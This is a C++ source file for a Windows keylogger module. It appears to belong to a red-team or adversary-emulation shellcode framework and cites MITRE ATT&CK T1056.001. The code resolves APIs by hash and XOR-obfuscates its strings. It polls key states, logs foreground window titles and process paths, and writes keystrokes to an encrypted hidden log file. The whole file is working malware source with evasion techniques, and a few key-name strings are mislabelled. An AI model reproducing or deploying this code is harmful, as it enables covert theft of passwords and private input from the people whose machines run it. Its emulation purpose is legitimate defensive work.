#include "module_registry.hpp"
#include "Keylogger.hpp"
#include <al/import.hpp>
#include "util.hpp"
#include "fnv1a.hpp"

#define KEY_NAME_BUFFER_MAX_LENGTH 128

DWORD CopyKeyInfo(char* dst, size_t keyInfoSize, LPCSTR src) {
    size_t src_len = strlen(src) + 1; // include null terminator
    size_t cpy_len = keyInfoSize < src_len ? keyInfoSize : src_len;
    pi_memcpy(dst, src, cpy_len);
    dst[cpy_len - 1] = 0; // truncate if needed

    return ERROR_SUCCESS;
}

// Get the correct key representation for the virtual keycode
DWORD GetKeyRepresentation(DWORD vkCode, char* keyInfo, size_t keyInfoSize, keylogger_pointers* ctx) {
    // https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
    // http://www.kbdedit.com/manual/low_level_vk_list.html

    if ((vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A)) {
        // get scan code
        UINT scanCode = ctx->fp_MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
        if (!ctx->fp_GetKeyNameTextA(scanCode << 16, keyInfo, keyInfoSize)) {
            return ctx->fp_GetLastError();
        } else {
            return ERROR_SUCCESS;
        }
    }

    switch (vkCode) {
    case VK_LBUTTON:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[LEFT MOUSE BUTTON]"_xor);
    case VK_RBUTTON:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[RIGHT MOUSE BUTTON]"_xor);
    case VK_CANCEL:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[CTRL+BREAK PROCESSING]"_xor);
    case VK_MBUTTON:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[MIDDLE MOUSE BUTTON]"_xor);
    case VK_XBUTTON1:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[X1 MOUSE BUTTON]"_xor);
    case VK_XBUTTON2:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[X2 MOUSE BUTTON]"_xor);
    case VK_BACK:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[BACKSPACE]"_xor);
    case VK_TAB:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[TAB]"_xor);
    case VK_CLEAR:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[CLEAR]"_xor);
    case VK_RETURN:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[ENTER]"_xor);
    case VK_SHIFT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[SHIFT]"_xor);
    case VK_CONTROL:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[CTRL]"_xor);
    case VK_MENU:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[ALT]"_xor);
    case VK_PAUSE:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[PAUSE]"_xor);
    case VK_CAPITAL:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[CAPS LOCK]"_xor);
    case VK_KANA: // same as VK_HANGUL
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME KANA MODE]"_xor);
    case VK_IME_ON:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME ON]"_xor);
    case VK_JUNJA:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME JUNJA MODE]"_xor);
    case VK_FINAL:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME FINAL MODE]"_xor);
    case VK_HANJA: // same as VK_KANJI
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME HANJA MODE]"_xor);
    case VK_IME_OFF:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME OFF]"_xor);
    case VK_ESCAPE:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[ESCAPE]"_xor);
    case VK_CONVERT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME CONVERT]"_xor);
    case VK_NONCONVERT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME NONCONVERT]"_xor);
    case VK_ACCEPT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME ACCEPT]"_xor);
    case VK_MODECHANGE:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[IME MODE CHANGE]"_xor);
    case VK_SPACE:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[SPACE]"_xor);
    case VK_PRIOR:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[PAGE UP]"_xor);
    case VK_NEXT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[PAGE DOWN]"_xor);
    case VK_END:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[END]"_xor);
    case VK_HOME:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[HOME]"_xor);
    case VK_LEFT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[LEFT ARROW]"_xor);
    case VK_UP:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[UP ARROW]"_xor);
    case VK_RIGHT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[RIGHT ARROW]"_xor);
    case VK_DOWN:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[DOWN ARROW]"_xor);
    case VK_SELECT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[SELECT]"_xor);
    case VK_PRINT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[PRINT]"_xor);
    case VK_EXECUTE:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[EXECUTE]"_xor);
    case VK_SNAPSHOT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[PRINT SCREEN]"_xor);
    case VK_INSERT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[INSERT]"_xor);
    case VK_DELETE:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[DELETE]"_xor);
    case VK_HELP:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[HELP]"_xor);
    case VK_LWIN:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[WIN KEY(LEFT)]"_xor);
    case VK_RWIN:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[WIN KEY(RIGHT)]"_xor);
    case VK_APPS:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[APPLICATIONS KEY]"_xor);
    case VK_SLEEP:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[SLEEP]"_xor);
    case VK_NUMPAD0:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 0]"_xor);
    case VK_NUMPAD1:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 1]"_xor);
    case VK_NUMPAD2:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 2]"_xor);
    case VK_NUMPAD3:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 3]"_xor);
    case VK_NUMPAD4:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 4]"_xor);
    case VK_NUMPAD5:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 5]"_xor);
    case VK_NUMPAD6:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 6]"_xor);
    case VK_NUMPAD7:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 7]"_xor);
    case VK_NUMPAD8:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 8]"_xor);
    case VK_NUMPAD9:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD 9]"_xor);
    case VK_MULTIPLY:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD *]"_xor);
    case VK_ADD:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD +]"_xor);
    case VK_SEPARATOR:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[SEPARATOR]"_xor);
    case VK_SUBTRACT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD -]"_xor);
    case VK_DECIMAL:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD .]"_xor);
    case VK_DIVIDE:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMPAD /]"_xor);
    case VK_F1:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F1]"_xor);
    case VK_F2:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F2]"_xor);
    case VK_F3:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F3]"_xor);
    case VK_F4:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F4]"_xor);
    case VK_F5:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F5]"_xor);
    case VK_F6:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F6]"_xor);
    case VK_F7:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F7]"_xor);
    case VK_F8:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F8]"_xor);
    case VK_F9:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F9]"_xor);
    case VK_F10:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F10]"_xor);
    case VK_F11:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F1]"_xor);
    case VK_F12:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F12]"_xor);
    case VK_F13:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F13]"_xor);
    case VK_F14:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F1]4"_xor);
    case VK_F15:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F15]"_xor);
    case VK_F16:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F16]"_xor);
    case VK_F17:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F17]"_xor);
    case VK_F18:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F18]"_xor);
    case VK_F19:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F19]"_xor);
    case VK_F20:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F20]"_xor);
    case VK_F21:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F21]"_xor);
    case VK_F22:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F22]"_xor);
    case VK_F23:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F23]"_xor);
    case VK_F24:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[F24]"_xor);
    case VK_NUMLOCK:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[NUMLOCK]"_xor);
    case VK_SCROLL:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[SCROLL LOCK]"_xor);
    case VK_LSHIFT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[SHIFT (LEFT)]"_xor);
    case VK_RSHIFT:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[SHIFT (RIGHT)]"_xor);
    case VK_LCONTROL:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[CTRL (LEFT)]"_xor);
    case VK_RCONTROL:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[CTRL (RIGHT)]"_xor);
    case VK_LMENU:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[ALT (LEFT)]"_xor);
    case VK_RMENU:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[ALT (RIGHT)]"_xor);
    case VK_BROWSER_BACK:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[BROWSER BACK]"_xor);
    case VK_BROWSER_FORWARD:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[BROWSER FORWARD]"_xor);
    case VK_BROWSER_REFRESH:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[BROWSER REFRESH]"_xor);
    case VK_BROWSER_STOP:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[BROWSER STOP]"_xor);
    case VK_BROWSER_SEARCH:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[BROWSER SEARCH]"_xor);
    case VK_OEM_PLUS:
        return CopyKeyInfo(keyInfo, keyInfoSize, "+");
    case VK_OEM_COMMA:
        return CopyKeyInfo(keyInfo, keyInfoSize, ",");
    case VK_OEM_MINUS:
        return CopyKeyInfo(keyInfo, keyInfoSize, "-");
    case VK_OEM_PERIOD:
        return CopyKeyInfo(keyInfo, keyInfoSize, ".");

        // Misc OEM char keys. Can vary by keyboard. Assuming US Standard Keyboard
    case VK_OEM_1:
        return CopyKeyInfo(keyInfo, keyInfoSize, ";");
    case VK_OEM_2:
        return CopyKeyInfo(keyInfo, keyInfoSize, "/");
    case VK_OEM_3:
        return CopyKeyInfo(keyInfo, keyInfoSize, "`");
    case VK_OEM_4:
        return CopyKeyInfo(keyInfo, keyInfoSize, "[");
    case VK_OEM_5:
        return CopyKeyInfo(keyInfo, keyInfoSize, "\\");
    case VK_OEM_6:
        return CopyKeyInfo(keyInfo, keyInfoSize, "]");
    case VK_OEM_7:
        return CopyKeyInfo(keyInfo, keyInfoSize, "'");
    default:
        return CopyKeyInfo(keyInfo, keyInfoSize, "UNKNOWN KEY"_xor);
    }
    return ERROR_SUCCESS;
}

// Populates function pointers for use throughout shellcode
DWORD FetchFunctions(keylogger_pointers* fp, sh_context* ctx) {
    auto kernel32 = GM(L"KERNEL32.DLL", by_ror13);
    if (!kernel32) {
        return FAIL_GET_KERNEL32;
    }

    auto llw = GP(kernel32, LoadLibraryW, by_fnv1a);
    if (!llw) {
        return FAIL_GET_LOADLIBRARYW;
    }

    HMODULE user32 = llw(L"user32.dll"_xor);
    if (!user32) {
        return FAIL_LOAD_USER32;
    }

    HMODULE psapi = llw(L"psapi.dll"_xor);
    if (!psapi) {
        return FAIL_LOAD_USER32;
    }

    fp->fp_GetAsyncKeyState = GP(user32, GetAsyncKeyState, by_fnv1a);
    if (!fp->fp_GetAsyncKeyState) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_GETASYNCKEYSTATE;
    }

    fp->fp_MapVirtualKeyA = GP(user32, MapVirtualKeyA, by_fnv1a);
    if (!fp->fp_MapVirtualKeyA) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_MAPVIRTUALKEYA;
    }

    fp->fp_GetKeyNameTextA = GP(user32, GetKeyNameTextA, by_fnv1a);
    if (!fp->fp_GetKeyNameTextA) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_GETKEYNAMETEXTA;
    }

    fp->fp_Sleep = GP(kernel32, Sleep, by_fnv1a);
    if (!fp->fp_Sleep) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_SLEEP;
    }

    fp->fp_CloseHandle = GP(kernel32, CloseHandle, by_fnv1a);
    if (!fp->fp_CloseHandle) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CLOSEHANDLE;
    }

    fp->fp_GetLastError = GP(kernel32, GetLastError, by_fnv1a);
    if (!fp->fp_GetLastError) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_GETLASTERROR;
    }

    fp->fp_CreateThread = GP(kernel32, CreateThread, by_fnv1a);
    if (!fp->fp_CreateThread) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CREATETHREAD;
    }

    fp->fp_GetForegroundWindow = GP(user32, GetForegroundWindow, by_fnv1a);
    if (!fp->fp_GetForegroundWindow) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_GETFOREGROUNDWINDOW;
    }

    fp->fp_GetWindowTextA = GP(user32, GetWindowTextA, by_fnv1a);
    if (!fp->fp_GetWindowTextA) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_GETWINDOWTEXTA;
    }

    fp->fp_GetWindowThreadProcessId = GP(user32, GetWindowThreadProcessId, by_fnv1a);
    if (!fp->fp_GetWindowThreadProcessId) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_GETWINDOWTHREADPROCESSID;
    }

    fp->fp_OpenProcess = GP(kernel32, OpenProcess, by_fnv1a);
    if (!fp->fp_OpenProcess) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_OPENPROCESS;
    }

    fp->fp_GetModuleFileNameExA = GP(psapi, GetModuleFileNameExA, by_fnv1a);
    if (!fp->fp_GetModuleFileNameExA) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_GETMODULEFILENAMEEXA;
    }

    fp->shared_fp = ctx->fp.shared_fp;

    return ERROR_SUCCESS;
}

// Helper function for HandleKeyLogger, runs in thread to capture and log keystrokes
DWORD WINAPI KeyloggerLoop(LPVOID lpctx) {
    keylogger_pointers* ctx = (keylogger_pointers*)lpctx;
    logger_ctx log_ctx;

    // Set up file logger for keylogging
    DWORD result = AesLogger::InitializeLogger(&(ctx->shared_fp), L"C:\\users\\public\\k.log"_xor, 0, &log_ctx);
    if (result != ERROR_SUCCESS) {
        return result;
    }

    AesLogger::LogInfo(&log_ctx, "======================"_xor);
    AesLogger::LogInfo(&log_ctx, "Initialized Keylogger."_xor);
    AesLogger::LogInfo(&log_ctx, "======================"_xor);

    // loop and check key states
    // Reference: https://gist.github.com/dasgoll/7ca1c059dd3b3fbc7277
    BYTE keyboardState[256];
    SHORT keyState;
    UINT scanCode;
    DWORD bytes_written;
    LONG lParamValue;
    HWND prevWindow = NULL;
    char winTitle[128];
    char processPath[256];
    DWORD pid;
    char keyInfoBuf[KEY_INFO_SIZE];

    while (true) {
        HWND currWindow = ctx->fp_GetForegroundWindow();
        if (currWindow && currWindow != prevWindow) {
            prevWindow = currWindow;
            if (ctx->fp_GetWindowTextA(currWindow, winTitle, 127)) {
                DWORD threadId = ctx->fp_GetWindowThreadProcessId(currWindow, &pid);
                if (threadId) {
                    HANDLE hProcess = ctx->fp_OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
                    if (hProcess) {
                        if (ctx->fp_GetModuleFileNameExA(hProcess, NULL, processPath, 255)) {
                            AesLogger::LogInfo(&log_ctx, "New window context: [%s - %s]"_xor, processPath, winTitle);
                        } else {
                            AesLogger::LogError(&log_ctx, "Failed to get process path. Error code: %d"_xor, ctx->fp_GetLastError());
                        }
                        ctx->fp_CloseHandle(hProcess);
                    } else {
                        AesLogger::LogError(&log_ctx, "Failed to access window process. Error code: %d"_xor, ctx->fp_GetLastError());
                    }
                } else {
                    AesLogger::LogError(&log_ctx, "Failed to get window thread/process ID. Error code: %d"_xor, ctx->fp_GetLastError());
                }
            } else {
                DWORD error_code = ctx->fp_GetLastError();
                if (error_code != ERROR_SUCCESS) {
                    AesLogger::LogError(&log_ctx, "Failed to get foreground window title. Error code: %d"_xor, ctx->fp_GetLastError());
                }
            }
        }

        // Useful virtual key codes start after 0x8
        for (UINT keyCode = 8; keyCode <= 254; keyCode++) {
            keyState = ctx->fp_GetAsyncKeyState(keyCode);

            if (keyState & 0x8000) { // key is pressed
                // get scan code
                result = GetKeyRepresentation(keyCode, keyInfoBuf, KEY_INFO_SIZE, ctx);
                if (result != ERROR_SUCCESS) {
                    AesLogger::LogError(&log_ctx, "Failed to get key information. Error code: %d"_xor, result);
                } else {
                    AesLogger::LogInfo(&log_ctx, "Pressed: %s."_xor, keyInfoBuf);
                }
            }
        }

        ctx->fp_Sleep(100);
    }

    AesLogger::LogInfo(&log_ctx, "Closing logger and exiting."_xor);
    AesLogger::CloseLogger(&log_ctx);
    return 0;
}

/*
 * HandleKeylogger:
 *      About:
 *          Spawns a thread to log user keystrokes and record in log file.
 *      Result:
 *          Keystrokes recorded in log file.
 *      MITRE ATT&CK Techniques:
 *          T1056.001: Input Capture: Keylogging
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html
 */
void HandleKeylogger(void* data, void* context, logger_ctx* log_ctx) {
    keylogger_pointers* ctx = (keylogger_pointers*)context;
    module_context_t* m_ctx = (module_context_t*)data;

    if (ctx && ctx->fp_CreateThread) {
        AesLogger::LogDebug(log_ctx, "Creating keylogger thread."_xor);
        DWORD threadId;
        HANDLE hThread = ctx->fp_CreateThread(nullptr, 0, KeyloggerLoop, (LPVOID)ctx, 0, &threadId);
        if (hThread == NULL) {
            AesLogger::LogError(log_ctx, "Failed to create thread. Error code: %d."_xor, log_ctx->fp->fp_GetLastError());
            m_ctx->output = (char*)"Failed to create thread.";
            m_ctx->outputSize = strlen((char*)m_ctx->output);
            return;
        }
        ctx->fp_CloseHandle(hThread);

        AesLogger::LogSuccess(log_ctx, "Created keylogger thread with ID %d."_xor, threadId);
        m_ctx->output = (char*)"Created keylogger thread.";
        m_ctx->outputSize = strlen((char*)m_ctx->output);
        return;
    }
    AesLogger::LogError(log_ctx, "Could not create keylogger thread. Missing context or CreateThread function"_xor);
    return;
}

DWORD RegisterModule_Keylogger(sh_context* ctx, uint32_t module_id) {
    keylogger_pointers* m_ctx = (keylogger_pointers*)ctx->fp.fp_malloc(sizeof(keylogger_pointers));
    if (!m_ctx) {
        AesLogger::LogError(ctx->log_ctx, "Failed to allocate memory for module with ID 0x%x"_xor, module_id);
        return CUSTOM_MODULE_KEYLOGGER_FAIL_MALLOC_STRUCT;
    }

    DWORD result = ERROR_SUCCESS;

    result = FetchFunctions(m_ctx, ctx);
    if (result != ERROR_SUCCESS) {
        ctx->fp.fp_free(m_ctx);
        AesLogger::LogError(ctx->log_ctx, "Failed to fetch functions for module with ID 0x%x. Error code: %d"_xor, module_id, result);
        return CUSTOM_MODULE_KEYLOGGER_FAIL_GET_POINTERS;
    }

    result = RegisterModule(ctx, module_id, HandleKeylogger, m_ctx);
    if (result != ERROR_SUCCESS) {
        ctx->fp.fp_free(m_ctx);
        AesLogger::LogError(ctx->log_ctx, "Failed to register module ID 0x%x. Error code: %d"_xor, module_id, result);
        return CUSTOM_MODULE_KEYLOGGER_FAIL_REGISTER_MODULE;
    }

    AesLogger::LogSuccess(ctx->log_ctx, "Successfully registered module 0x%x."_xor, module_id);

    return result;
}
